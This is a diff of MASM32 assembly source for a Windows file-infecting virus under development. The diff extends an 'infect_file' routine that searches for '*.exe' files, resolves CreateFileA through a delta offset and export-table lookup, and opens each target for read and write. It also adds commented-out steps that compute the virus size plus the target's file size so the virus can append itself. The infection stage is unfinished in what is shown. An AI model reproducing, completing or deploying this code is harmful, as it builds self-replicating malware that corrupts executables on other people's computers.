@@ -9,7 +9,7 @@
 
 .386
 .model flat, stdcall
-option casemap :none
+option casemap: none
 
     include \masm32\include\windows.inc
     include \masm32\include\user32.inc
@@ -26,7 +26,6 @@ option casemap :none
 
 .data
 ; No data here please, put it at the end of the .code section
-teststr db "test",10,0
 
 .code
 
@@ -120,13 +119,16 @@ find_first:
 
     ; Else save the handle (dd) in ebx // TODO: has to be changed, too unstable
     xor     ebx, ebx
-    mov     ebx, eax
+    mov     ebx, eax ; store handle address
     push    ebx
 
+    ; save WIN32_FIND_DATAA in edx
+    xor     edx, edx
+    lea     edx, [ebp - 320]
     ; DEBUG print first .exe found
-    xor     eax, eax
-    lea     eax, [ebp - 276]
-    invoke  StdOut, eax
+    ;add     edx, 44
+    ;invoke  StdOut, edx
+    ;sub     edx, 44
 
     ; restore ebp
     mov     esp, ebp
@@ -169,14 +171,16 @@ find_next:
     jz      exit_fail
 
     ; DEBUG print next .exe found
-    xor     eax, eax
-    lea     eax, [ebp - 276]
-    invoke  StdOut, eax
+    ;xor     eax, eax
+    ;lea     eax, [ebp - 276]
+    ;invoke  StdOut, eax
 
     ; restore ebp
     mov     esp, ebp
     pop     ebp
 
+    xor     edx, edx
+    lea     edx, [ebp - 320]
     ; infect next .exe file
     call    infect_file
 
@@ -477,8 +481,72 @@ strcmp_done:
     ret     8
 
 infect_file:
-    ; nada
-    ret
+    ; infect found .exe file
+
+    push    edx
+
+    xor     eax, eax
+    mov     eax, ebp ; EBP -> real address of delta offset
+    add     eax, offset CreateFile_b
+    sub     eax, offset deltaoffset
+
+    ; call ent_get_function_addr with "CreateFileA" (A=Ansii)
+    push    eax
+    push    edi ; PE header
+    push    esi ; DOS header
+    call    ent_get_function_addr
+
+    pop     edx
+    ; open file
+    ;push    00h
+    ;push    00h
+    ;push    03h
+    ;push    00h
+    ;push    01h
+    ;push    0C0000000h
+
+    push    00h ; no template handle
+    push    80h ; flag FILE_ATTRIBUTE_NORMAL
+    push    03h ; flag OPEN_EXISTING
+    push    00h
+    push    00h
+    push    0C0000000h ; flag GENERIC_WRITE | GENERIC_READ
+    add     edx, 44 ; change to cFileName's address in WIN32_FIND_DATAA struct
+    push    edx
+    call    eax
+    sub     edx, 44 ; restore address of WIN32_FIND_DATAA struct
+
+    ; return if file couldn't be opened
+    cmp     eax, -1 ; INVALID_HANDLE_VALUE
+    jz      end_infect_file
+
+    ; else
+    jmp     exit_success
+
+    ; set up stack frame
+    ;push    ebp
+    ;mov     ebp, esp
+    ;sub     esp, 2
+
+    ; virus size + win32_find_data.nFileSizeLow
+    ;xor     ecx, ecx
+    ;lea     ecx, [ebp - 2]
+    ;mov     ecx, virusSize ; virus size
+    ;add     edx, 38 ; win32_find_data.nFileSizeLow
+    ;add     ecx, edx
+    ;sub     edx, 38
+
+    ;mov     [ebp - 2], virusSize
+    ;add     edx, 38 ; win32_find_data.nFileSizeLow
+    ;add     [ebp - 2], edx
+    ;sub     edx, 38
+
+    ; restore ebp
+    ;mov     esp, ebp
+    ;pop     ebp
+
+    end_infect_file:
+        retn
 
 exit_success:
     ; WIN
@@ -491,7 +559,7 @@ exit_fail:
     call    eax
 
 ; All the virus data: use delta offset
-virus_data:
+_data:
 
    filetime struct
        dwLowDateTime     DWORD     ?
@@ -515,6 +583,7 @@ virus_data:
    ;win32_find_data WIN32_FIND_DATAA <?>
    ;FileHandleFind  dd ?
    filter          db "*.exe",0
+   virusSize       equ jambi_end - start
 
    ;WndTextOut1 db  "Address: 0x"
    ;WndTextOut2 db  8 dup (66), 13, 10
@@ -525,9 +594,11 @@ virus_data:
 
    FindFirstFile_b db  "FindFirstFileA",0
    FindNextFile_b  db  "FindNextFileA",0
+   CreateFile_b    db  "CreateFileA",0
    ExitProcess_b   db  "ExitProcess",0
    ExitProcess_f   dd  0
    Beep_b          db  "Beep",0
    Beep_f          dd  0
 
+jambi_end:
 end start
